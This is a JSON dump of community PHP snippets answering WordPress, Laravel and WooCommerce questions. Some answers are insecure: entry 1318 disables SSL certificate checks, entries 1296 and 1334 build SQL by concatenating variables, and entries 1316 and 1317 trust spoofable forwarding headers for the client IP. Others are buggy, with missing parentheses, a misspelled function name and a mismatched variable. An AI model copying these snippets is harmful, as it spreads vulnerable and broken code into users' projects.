    "description": "echo get_the_post_thumbnail_url();\n<?php    // ALL parameters are optional. Not needed if you are on WP LOOP   echo get_the_post_thumbnail_url( $the_query->ID, array( 500, 400) ); ?>\nif ( has_post_thumbnail()) {    $large_image_url = wp_get_attachment_image_src( get_post_thumbnail_id(), 'large');    echo '<a href=\"' . $large_image_url[0] . '\">';    the_post_thumbnail('thumbnail');    echo '</a>'; } \n<?php echo the_post_thumbnail(); ?>\nget_post_thumbnail_id($post) \n<?php if(has_post_thumbnail()){   the_post_thumnbail('cstm_name', array( 'class' => 'class1 class2' )) } else { ?>   <img class=\"card-img-top\" src=\"http://placehold.it/750x300\" alt=\"Card image cap\" class=\"img-responsive\"> <?php } ?>\n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1294,
    "keyword": null,
    "link": null,
    "title": " get field acf",
    "description": "$content = get_field('content', $post_id);\n$value = get_field( \"text_field\" );  if( $value ) {     echo $value; } else {     echo 'empty'; }\nget_field($selector, [$post_id], [$format_value]); /* $selector (string) (Required) The field name or field key. $post_id (mixed) (Optional) The post ID where the value is saved. Defaults to the current post. $format_value (bool) (Optional) Whether to apply formatting logic. Defaults to true. */ // Get a value from the current post $value = get_field( \"text_field\" ); // Get a value from a specific post $value = get_field( \"field_name\", $post_id );\nget_field_object('content', post_id);\n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1295,
    "keyword": null,
    "link": null,
    "title": " get file name from file path in php",
    "description": "<?php $path_parts = pathinfo('/www/htdocs/inc/lib.inc.php');  echo $path_parts['dirname'], \"\\n\"; echo $path_parts['basename'], \"\\n\"; echo $path_parts['extension'], \"\\n\"; echo $path_parts['filename'], \"\\n\"; // since PHP 5.2.0 ?> \n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1296,
    "keyword": null,
    "link": null,
    "title": " get first day of current month php",
    "description": "<?php     // First day of this month     $d = new DateTime('first day of this month');     echo $d->format('jS, F Y'); ?>\n//get first day of the current month  $start = date(\"Y-m-1 00:00:00\"); //get current date of the month $end = date(\"Y-m-d H:i:s\");  //query data for the current month so far $query = $this->db_model->run_query(\"select column_1, column_2 from table where date_column BETWEEN '\".$start.\"' AND '\".$end.\"'\");\n$config_month  = 1; $config_day = 1;  $new_expiry_date = date('Y-m-d', mktime(0, 0, 0, date('m') + $config_month, 1 + $config_day, date('Y')));                 \n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1297,
    "keyword": null,
    "link": null,
    "title": " get first element of array php",
    "description": "$firstKey = array_key_first($array);\n$sliced_array = array_slice($array, 0, 5) \narray_values($array)[0]; \n$firstItem = array_shift($array);\n$colors = array(2=>\"blue\",3 =>\"green\",1=>\"red\"); $firstValue = reset($colors); //blue $firstKey = key($colors); //2\narray_pop(array_reverse($array)); \n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1298,
    "keyword": null,
    "link": null,
    "title": " get first key of array php",
    "description": "$firstKey = array_key_first($array);\narray_values($array)[0]; \n$colors = array(2=>\"blue\",3 =>\"green\",1=>\"red\"); $firstValue = reset($colors); //blue $firstKey = key($colors); //2\n<?php $stack = array(\"orange\", \"banana\", \"apple\", \"raspberry\"); $fruit = array_shift($stack); //Remove \"orange\" from array and return it print_r($stack); /** OUTPUT: Array (     [0] => banana     [1] => apple     [2] => raspberry ) */ ?>\nFor PHP version 7 and above  $array = array(   \t\"1\" => \"PHP code tester Sandbox Online\",   \t\"foo\" => \"bar\", \t\"case\" => \"Random Stuff: \" . rand(100,999), \t\"PHP Version\" => phpversion() );               $firstValue = reset($colors); // PHP code tester Sandbox Online $firstKey = key($colors); // 1\n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1299,
    "keyword": null,
    "link": null,
    "title": " get first word from string php",
    "description": "$firstStringCharacter = substr(\"hello\", 0, 1);\n$words = explode(\" \", $string);  $firstname = $words[0]; $lastname = $words[1]; $third_word = $words[2];\nfunction getFirstWord($string)     {         $arr = explode(' ', trim($string));         return isset($arr[0]) ? $arr[0] : $string;     }\n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1300,
    "keyword": null,
    "link": null,
    "title": " get full url php",
    "description": "$fullURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n//Get complete URL with http/https and GET parameters $complete_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n$actual_link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; \n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1301,
    "keyword": null,
    "link": null,
    "title": " get hours difference between two dates in php",
    "description": "$hourdiff = round((strtotime($time1) - strtotime($time2))/3600, 1);\n\tdate_default_timezone_set(\"Africa/Johannesburg\");     $now = new DateTime();     $future_date = new DateTime('2020-10-21 00:00:00');          $interval = $future_date->diff($now);          echo ($interval->format(\"%a\") * 24) + $interval->format(\"%h\"). \" hours\". $interval->format(\" %i minutes \");     print_r($now->format('Y-m-d H:i:s')); \n",
    "reg_date": "2021-10-12T10:14:13.000Z"
  },
  {
    "id": 1302,
    "keyword": null,
    "link": null,
    "title": " get html file data to variable in php",
    "description": "$Vdata = file_get_contents('path/to/YOUR/FILE.php');\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1303,
    "keyword": null,
    "link": null,
    "title": " get http method php",
    "description": "if ($_SERVER['REQUEST_METHOD'] === 'POST') {      // The request is using the POST method }\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1304,
    "keyword": null,
    "link": null,
    "title": " get id by url wordpress",
    "description": "// https://developer.wordpress.org/reference/functions/url_to_postid/ url_to_postid( string $url )\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1305,
    "keyword": null,
    "link": null,
    "title": " get id of record created",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn = mysqli_connect($servername, $username, $password, $dbname); // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); }  $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\";  if (mysqli_query($conn, $sql)) {     $last_id = mysqli_insert_id($conn);     echo \"New record created successfully. Last inserted ID is: \" . $last_id; } else {     echo \"Error: \" . $sql . \"<br>\" . mysqli_error($conn); }  mysqli_close($conn); ?>\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1306,
    "keyword": null,
    "link": null,
    "title": " get id of record created php",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn = mysqli_connect($servername, $username, $password, $dbname); // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); }  $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\";  if (mysqli_query($conn, $sql)) {     $last_id = mysqli_insert_id($conn);     echo \"New record created successfully. Last inserted ID is: \" . $last_id; } else {     echo \"Error: \" . $sql . \"<br>\" . mysqli_error($conn); }  mysqli_close($conn); ?>\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1307,
    "keyword": null,
    "link": null,
    "title": " get id php",
    "description": "<a href=\"index.php?id=<?php echo $my_id;?>&name=<?php echo $my_name;?>Click</a>  <?php $id = intval($_GET['id']);\t\t// integer value $name = strval($_GET['name']);\t// string value ?>\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1308,
    "keyword": null,
    "link": null,
    "title": " get id user login laravel",
    "description": "use Auth; $user_id = Auth::user()->id; \n$userId = Auth::id();\n// Get the currently authenticated user's ID... $id = Auth::id();\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1309,
    "keyword": null,
    "link": null,
    "title": " get if bowser supports webp php",
    "description": "if( strpos( $_SERVER['HTTP_ACCEPT'], 'image/webp' ) !== false ) {     // webp is supported! }\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1310,
    "keyword": null,
    "link": null,
    "title": " get image extension in php",
    "description": "//get image extension of uploaded file in php $imagetype = $_FILES['image']['name']; $ext = pathinfo($imagetype, PATHINFO_EXTENSION);// get file extension\n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1311,
    "keyword": null,
    "link": null,
    "title": " get image size php",
    "description": "$image_size = $_FILES[\"inputfilename\"][\"size\"]; /*Not From Form*/ $img_size = getimagesize(\"imagepath\"); // returns an array that is filled with info print_r($img_size); \n",
    "reg_date": "2021-10-12T10:14:14.000Z"
  },
  {
    "id": 1312,
    "keyword": null,
    "link": null,
    "title": " get image width and height in laravel",
    "description": "Core php : list($width, $height, $type, $attr) = getimagesize($_FILES[\"gallery_image\"]['tmp_name']);  With Intervention : $upload_file = $request->file('gallery_image'); $height = Image::make($upload_file)->height(); $width = Image::make($upload_file)->width();\n   $image = getimagesize($request->image);         $width = $image[0];         $height = $image[1];\n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1313,
    "keyword": null,
    "link": null,
    "title": " get index of element in array php",
    "description": "$array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1;\n$array = array('foo' => 'bar', 33 => 'bin', 'lorem' => 'ipsum'); $array = array_values($array); echo $array[0]; //bar echo $array[1]; //bin echo $array[2]; //ipsum\n$array = array('foo' => 'bar', 33 => 'bin', 'lorem' => 'ipsum'); $array = array_values($array); echo $array[0]; //bar echo $array[1]; //bin echo $array[2]; //ipsum \n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1314,
    "keyword": null,
    "link": null,
    "title": " get information from another website",
    "description": "///Display the whole page <iframe src=\"https://www.example.org/\"></iframe> ///Fetch website contents(needs PHP). $mystring = file_get_contents(\"https://www.example.org/\")\n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1315,
    "keyword": null,
    "link": null,
    "title": " get input data in php",
    "description": "<?php // open it in cmd // go to file path  // cmd: php file_name $a =(int)readline(\"Enter any value\"); $b=0; // echo $a; for($i=0;$i<$a;$i++) {     echo $i;      } ?>\n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1316,
    "keyword": null,
    "link": null,
    "title": " get ip address in laravel",
    "description": "request()->ip();\npublic function getUserIpAddr(){        $ipaddress = '';        if (isset($_SERVER['HTTP_CLIENT_IP']))            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];        else if(isset($_SERVER['HTTP_X_FORWARDED']))            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];        else if(isset($_SERVER['HTTP_FORWARDED']))            $ipaddress = $_SERVER['HTTP_FORWARDED'];        else if(isset($_SERVER['REMOTE_ADDR']))            $ipaddress = $_SERVER['REMOTE_ADDR'];        else            $ipaddress = 'UNKNOWN';            return $ipaddress;     } \n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1317,
    "keyword": null,
    "link": null,
    "title": " get ip in laravel",
    "description": "request()->ip();\npublic function getUserIpAddr(){        $ipaddress = '';        if (isset($_SERVER['HTTP_CLIENT_IP']))            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];        else if(isset($_SERVER['HTTP_X_FORWARDED']))            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];        else if(isset($_SERVER['HTTP_FORWARDED']))            $ipaddress = $_SERVER['HTTP_FORWARDED'];        else if(isset($_SERVER['REMOTE_ADDR']))            $ipaddress = $_SERVER['REMOTE_ADDR'];        else            $ipaddress = 'UNKNOWN';            return $ipaddress;     } \n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1318,
    "keyword": null,
    "link": null,
    "title": " get json from url php",
    "description": "$url = \"http://urlToYourJsonFile.com\"; $json = file_get_contents($url); $json_data = json_decode($json, true); echo \"My token: \". $json_data[\"access_token\"];\n$ch = curl_init(); // IMPORTANT: the below line is a security risk, read https://paragonie.com/blog/2017/10/certainty-automated-cacert-pem-management-for-php-software // in most cases, you should set it to true curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_URL, 'url_here'); $result = curl_exec($ch); curl_close($ch);  $obj = json_decode($result); echo $obj->access_token;\n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1319,
    "keyword": null,
    "link": null,
    "title": " get key by value array php",
    "description": " <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1320,
    "keyword": null,
    "link": null,
    "title": " get key of array element php",
    "description": "array_keys ($array); // It returns an array // more informations at https://www.php.net/manual/fr/function.array-keys.php (fr)\n$people = array(   2 => array(     'name' => 'John',     'fav_color' => 'green'   ),   5=> array(     'name' => 'Samuel',     'fav_color' => 'blue'   )); $found_key = array_search('blue', array_column($people, 'fav_color'));\n",
    "reg_date": "2021-10-12T10:14:15.000Z"
  },
  {
    "id": 1321,
    "keyword": null,
    "link": null,
    "title": " get key of last element php",
    "description": "//(PHP 7 >= 7.3.0) $key = array_key_last($data);  //ALL PHP Versions end($data);         // move the internal pointer to the end of the array $key = key($data);  // fetches the key of the element pointed to by the internal pointer  \n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1322,
    "keyword": null,
    "link": null,
    "title": " get key of value array php",
    "description": " <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \n$people = array(   2 => array(     'name' => 'John',     'fav_color' => 'green'   ),   5=> array(     'name' => 'Samuel',     'fav_color' => 'blue'   )); $found_key = array_search('blue', array_column($people, 'fav_color'));\n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1323,
    "keyword": null,
    "link": null,
    "title": " get last character of string php",
    "description": "substr(\"testers\", -1); // returns \"s\"\nfunction getLastWord($string)     {         $string = explode(' ', $string);         $last_word = array_pop($string);         return $last_word;     }\nphpCopy<?php   $string = \"This is a string\";  $lastChar = $string[-1]; echo \"The last char of the string is $lastChar.\"; ?> \nphpCopy<?php   $string = 'This is a string'; $lastChar = substr($string, -1); echo \"The last char of the string is $lastChar.\"; ?> \nphpCopy<?php   $string = \"This is a string\"; $lengthOfString = strlen($string); $lastCharPosition = $lengthOfString-1; $lastChar = $string[$lastCharPosition]; echo \"The last char of the string is $lastChar.\"; ?> \nphpCopy<?php  $string = \"This is a string\"; $lastCharPosition = strlen($string) - 1;   for ($x = $lastCharPosition; $x < strlen($string); $x++) {     $newString = $string[$x];  }  echo \"The last char of the string is $newString.\"; ?>  \n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1324,
    "keyword": null,
    "link": null,
    "title": " get last inserted id in php",
    "description": "Example (MySQLi Procedural) $last_id = mysqli_insert_id($conn);\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn = mysqli_connect($servername, $username, $password, $dbname); // Check connection if (!$conn) {     die(\"Connection failed: \" . mysqli_connect_error()); }  $sql = \"INSERT INTO MyGuests (firstname, lastname, email) VALUES ('John', 'Doe', 'john@example.com')\";  if (mysqli_query($conn, $sql)) {     $last_id = mysqli_insert_id($conn);     echo \"New record created successfully. Last inserted ID is: \" . $last_id; } else {     echo \"Error: \" . $sql . \"<br>\" . mysqli_error($conn); }  mysqli_close($conn); ?>\n$this_id = mysqli_insert_id($db);\n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1325,
    "keyword": null,
    "link": null,
    "title": " get last month php",
    "description": "$currentMonth = date('M');// if number, then date('m'); //Last month $lastMonth = Date(\"F\", strtotime(\"first day of previous month\"); $nextMonth = Date(\"F\", strtotime(\"first day of next month\");\n$first_day_this_month = date('m-01-Y'); // hard-coded '01' for first day $last_day_this_month  = date('m-t-Y');\n//Last month $lastMonth = Date(\"F\", strtotime(\"first day of previous month\"); $nextMonth = Date(\"F\", strtotime(\"first day of next month\");\n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1326,
    "keyword": null,
    "link": null,
    "title": " get last word from string php",
    "description": "substr(\"testers\", -1); // returns \"s\"\nfunction getLastWord($string)     {         $string = explode(' ', $string);         $last_word = array_pop($string);         return $last_word;     }\nphpCopy<?php   $string = \"This is a string\";  $lastChar = $string[-1]; echo \"The last char of the string is $lastChar.\"; ?> \nphpCopy<?php   $string = 'This is a string'; $lastChar = substr($string, -1); echo \"The last char of the string is $lastChar.\"; ?> \n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1327,
    "keyword": null,
    "link": null,
    "title": " get lat long from address php",
    "description": "<?php $address = \"Kathmandu, Nepal\"; $url = 'https://maps.googleapis.com/maps/api/geocode/json?address='.urlencode($address).'&key=apikey';  $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);     $responseJson = curl_exec($ch); curl_close($ch);  $response = json_decode($responseJson);  if ($response->status == 'OK') {     $latitude = $response->results[0]->geometry->location->lat;     $longitude = $response->results[0]->geometry->location->lng;      echo 'Latitude: ' . $latitude;     echo '<br />';     echo 'Longitude: ' . $longitude; } else {     echo $response->status;     var_dump($response); }     ?>\n  <!DOCTYPE html>  <html>  <form method=\"post\">  <input type=\"text\" name=\"address\">  <input type=\"submit\" name=\"submit\" value=\"submit\">  </form>  </html>  <?php  if(isset($_POST['submit']))  {   function getLatLong($address){      if(!empty($address)){          //Formatted address          $formattedAddr = str_replace(' ','+',$address);          //Send request and receive json data by address          $geocodeFromAddr = file_get_contents ('http://maps.googleapis.com/maps/api/geocode/json?address='.$formattedAddr.'&sensor=false');           $output = json_decode($geocodeFromAddr);          //Get latitude and longitute from json data          $data['latitude']  = $output->results[0]->geometry->location->lat;           $data['longitude'] = $output->results[0]->geometry->location->lng;          //Return latitude and longitude of the given address          if(!empty($data)){              return $data;          }else{              return false;          }      }else{          return false;         }  }  $address = $_POST['address'];  $latLong = getLatLong($address);  $latitude = $latLong['latitude']?$latLong['latitude']:'Not found';  $longitude = $latLong['longitude']?$latLong['longitude']:'Not found';  echo \"Latitude:\".$latitude.\"<br>\";  echo \"longitude:\".$longitude.\"\";  }  ?> \n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1328,
    "keyword": null,
    "link": null,
    "title": " get logged user id laravel",
    "description": "use Auth; $user_id = Auth::user()->id; \n$id = Auth::user()->id;print_r($id);\n$userId = Auth::id();\n// Get the currently authenticated user's ID... $id = Auth::id();\nAuth::user();\n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1329,
    "keyword": null,
    "link": null,
    "title": " get message validator failed laravel",
    "description": "$errors = $validator->errors()->getMessages();\n @if ($errors->any())     <div class=\"alert alert-danger\">         <ul>             @foreach ($errors->all() as $error)                 <li>{{ $error }}</li>             @endforeach         </ul>     </div> @endif \n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1330,
    "keyword": null,
    "link": null,
    "title": " get month first date and last date in php",
    "description": "$currentMonth = date('M');// if number, then date('m'); //Last month $lastMonth = Date(\"F\", strtotime(\"first day of previous month\"); $nextMonth = Date(\"F\", strtotime(\"first day of next month\");\n$first_day_this_month = date('m-01-Y'); // hard-coded '01' for first day $last_day_this_month  = date('m-t-Y');\n//Last month $lastMonth = Date(\"F\", strtotime(\"first day of previous month\"); $nextMonth = Date(\"F\", strtotime(\"first day of next month\");\n",
    "reg_date": "2021-10-12T10:14:16.000Z"
  },
  {
    "id": 1331,
    "keyword": null,
    "link": null,
    "title": " get month from database php",
    "description": "$month = date(\"m\",strtotime($mydate));\necho 'Day' . date('d', strtotime($row['Date'])); echo 'Month' . date('m', strtotime($row['Date'])); echo 'Year' . date('Y', strtotime($row['Date']));\n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1332,
    "keyword": null,
    "link": null,
    "title": " get multiple checkbox value in php",
    "description": "To pass the multiple checkbox values in one POST action in PHP you can refer below code:  Html form code <form method=\"post\" action=\"send_data.php\">     <input type=\"checkbox\" name=\"username[]\" value=\"user1\">User1     <input type=\"checkbox\" name=\"username[]\" value=\"user2\">User2     <input type=\"checkbox\" name=\"username[]\" value=\"user3\">User3     <input type=\"checkbox\" name=\"username[]\" value=\"user4\">User4     <input type=\"submit\" name=\"submit_data\"/> </form> send_data.php <?php if(isset($_POST[\"submit_data\"])){    if(!empty($_POST[\"username\"])){        // to check the username checkboxes values you can use loop to display each checkbox value        $usernames = $_POST[\"username\"];        foreach($usernames as $user){             echo \"User Name :\".$user;        }    }  } ?>\n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1333,
    "keyword": null,
    "link": null,
    "title": " get name custom post type wordpress",
    "description": "$pt = get_post_type_object( 'books' );  // These two usually contain the post type name in plural.  // They may differ though. echo $pt->label; echo $pt->labels->name;  // This one holds the post type name in singular. echo $pt->labels->singular_name;\n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1334,
    "keyword": null,
    "link": null,
    "title": " get nearby from longitude and latitude in laravel",
    "description": "\\DB::table(\"users\")      ->select(\"users.id\", \\DB::raw(\"6371 * acos(cos(radians(\" . $this->lat . \"))      * cos(radians(users.latitude))       * cos(radians(users.longitude) - radians(\" . $this->lng . \"))       + sin(radians(\" .$this->lat. \"))       * sin(radians(users.latitude))) AS distance\"))      ->having('distance', '<', $this->rad)      ->first(); \n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1335,
    "keyword": null,
    "link": null,
    "title": " get next month first day php",
    "description": "<?php     // First day of this month     $d = new DateTime('first day of this month');     echo $d->format('jS, F Y'); ?>\n$lastDateOfNextMonth =strtotime('last day of next month') ;  $lastDay = date('d/m/Y', $lastDateOfNextMonth);     print_r($lastDay);\n$config_month  = 1; $config_day = 1;  $new_expiry_date = date('Y-m-d', mktime(0, 0, 0, date('m') + $config_month, 1 + $config_day, date('Y')));                 \n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1336,
    "keyword": null,
    "link": null,
    "title": " get number of chars ina  string php",
    "description": "$name = \"Per&uacute;\"; // With accent mark echo strlen($name); // Display 5, because \"&uacute;\" require 2 bytes.  $name = \"Peru\"; // Without accent mark echo strlen($name); // Display 4\n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1337,
    "keyword": null,
    "link": null,
    "title": " get numbers from string php",
    "description": "$str = 'In My Cart : 11 items'; $int = (int) filter_var($str, FILTER_SANITIZE_NUMBER_INT);\nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; $outputString = preg_replace('/[^0-9]/', '', $string);   echo(\"The extracted numbers are: $outputString \\n\");  ?>  \nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; $int = (int) filter_var($string, FILTER_SANITIZE_NUMBER_INT);   echo(\"The extracted numbers are: $int \\n\");  ?>  \nphpCopy<?php  $string = 'Sarah has 4 dolls and 6 bunnies.'; preg_match_all('!\\d+!', $string, $matches); print_r($matches);  ?>  \n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1338,
    "keyword": null,
    "link": null,
    "title": " get only the first two word from a string php",
    "description": "$message = preg_split('/[\\s,]+/', $message, 3) \n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1339,
    "keyword": null,
    "link": null,
    "title": " get option field acf",
    "description": "<?php  $variable = get_field('field_name', 'option');  // do something with $variable  ?>\n",
    "reg_date": "2021-10-12T10:14:17.000Z"
  },
  {
    "id": 1340,
    "keyword": null,
    "link": null,
    "title": " get order details by id woocommerce",
    "description": "// Get $order object when you have the ID. $order = wc_get_order( $order_id );  // Get order key. $order->get_order_key();  // Get Order Totals $0.00 $order->get_formatted_order_total(); $order->get_cart_tax(); $order->get_currency(); $order->get_discount_tax(); $order->get_discount_to_display(); $order->get_discount_total(); $order->get_fees(); $order->get_formatted_line_subtotal(); $order->get_shipping_tax(); $order->get_shipping_total(); $order->get_subtotal(); $order->get_subtotal_to_display(); $order->get_tax_location(); $order->get_tax_totals(); $order->get_taxes(); $order->get_total(); $order->get_total_discount(); $order->get_total_tax(); $order->get_total_refunded(); $order->get_total_tax_refunded(); $order->get_total_shipping_refunded(); $order->get_item_count_refunded(); $order->get_total_qty_refunded(); $order->get_qty_refunded_for_item(); $order->get_total_refunded_for_item(); $order->get_tax_refunded_for_item(); $order->get_total_tax_refunded_by_rate_id(); $order->get_remaining_refund_amount();  // Get and Loop Over Order Items foreach ( $order->get_items() as $item_id => $item ) {    $product_id = $item->get_product_id();    $variation_id = $item->get_variation_id();    $product = $item->get_product();    $name = $item->get_name();    $quantity = $item->get_quantity();    $subtotal = $item->get_subtotal();    $total = $item->get_total();    $tax = $item->get_subtotal_tax();    $taxclass = $item->get_tax_class();    $taxstat = $item->get_tax_status();    $allmeta = $item->get_meta_data();    $somemeta = $item->get_meta( '_whatever', true );    $type = $item->get_type(); }  // Other Secondary Items Stuff $order->get_items_key(); $order->get_items_tax_classes(); $order->get_item_count(); $order->get_item_total(); $order->get_downloadable_items();    // Get Order Lines $order->get_line_subtotal(); $order->get_line_tax(); $order->get_line_total();    // Get Order Shipping $order->get_shipping_method(); $order->get_shipping_methods(); $order->get_shipping_to_display();    // Get Order Dates $order->get_date_created(); $order->get_date_modified(); $order->get_date_completed(); $order->get_date_paid();    // Get Order User, Billing & Shipping Addresses $order->get_customer_id(); $order->get_user_id(); $order->get_user(); $order->get_customer_ip_address(); $order->get_customer_user_agent(); $order->get_created_via(); $order->get_customer_note(); $order->get_address_prop(); $order->get_billing_first_name(); $order->get_billing_last_name(); $order->get_billing_company(); $order->get_billing_address_1(); $order->get_billing_address_2(); $order->get_billing_city(); $order->get_billing_state(); $order->get_billing_postcode(); $order->get_billing_country(); $order->get_billing_email(); $order->get_billing_phone(); $order->get_shipping_first_name(); $order->get_shipping_last_name(); $order->get_shipping_company(); $order->get_shipping_address_1(); $order->get_shipping_address_2(); $order->get_shipping_city(); $order->get_shipping_state(); $order->get_shipping_postcode(); $order->get_shipping_country(); $order->get_address(); $order->get_shipping_address_map_url(); $order->get_formatted_billing_full_name(); $order->get_formatted_shipping_full_name(); $order->get_formatted_billing_address(); $order->get_formatted_shipping_address();    // Get Order Payment Details $order->get_payment_method(); $order->get_payment_method_title(); $order->get_transaction_id();    // Get Order URLs $order->get_checkout_payment_url(); $order->get_checkout_order_received_url(); $order->get_cancel_order_url(); $order->get_cancel_order_url_raw(); $order->get_cancel_endpoint(); $order->get_view_order_url(); $order->get_edit_order_url();    // Get Order Status $order->get_status();\n// Get an instance of the WC_Order object $order = wc_get_order( $order_id );  $order_data = $order->get_data(); // The Order data  $order_id = $order_data['id']; $order_parent_id = $order_data['parent_id']; $order_status = $order_data['status']; $order_currency = $order_data['currency']; $order_version = $order_data['version']; $order_payment_method = $order_data['payment_method']; $order_payment_method_title = $order_data['payment_method_title']; $order_payment_method = $order_data['payment_method']; $order_payment_method = $order_data['payment_method'];  ## Creation and modified WC_DateTime Object date string ##  // Using a formated date ( with php date() function as method) $order_date_created = $order_data['date_created']->date('Y-m-d H:i:s'); $order_date_modified = $order_data['date_modified']->date('Y-m-d H:i:s');  // Using a timestamp ( with php getTimestamp() function as method) $order_timestamp_created = $order_data['date_created']->getTimestamp(); $order_timestamp_modified = $order_data['date_modified']->getTimestamp();  $order_discount_total = $order_data['discount_total']; $order_discount_tax = $order_data['discount_tax']; $order_shipping_total = $order_data['shipping_total']; $order_shipping_tax = $order_data['shipping_tax']; $order_total = $order_data['cart_tax']; $order_total_tax = $order_data['total_tax']; $order_customer_id = $order_data['customer_id']; // ... and so on  ## BILLING INFORMATION:  $order_billing_first_name = $order_data['billing']['first_name']; $order_billing_last_name = $order_data['billing']['last_name']; $order_billing_company = $order_data['billing']['company']; $order_billing_address_1 = $order_data['billing']['address_1']; $order_billing_address_2 = $order_data['billing']['address_2']; $order_billing_city = $order_data['billing']['city']; $order_billing_state = $order_data['billing']['state']; $order_billing_postcode = $order_data['billing']['postcode']; $order_billing_country = $order_data['billing']['country']; $order_billing_email = $order_data['billing']['email']; $order_billing_phone = $order_data['billing']['phone'];  ## SHIPPING INFORMATION:  $order_shipping_first_name = $order_data['shipping']['first_name']; $order_shipping_last_name = $order_data['shipping']['last_name']; $order_shipping_company = $order_data['shipping']['company']; $order_shipping_address_1 = $order_data['shipping']['address_1']; $order_shipping_address_2 = $order_data['shipping']['address_2']; $order_shipping_city = $order_data['shipping']['city']; 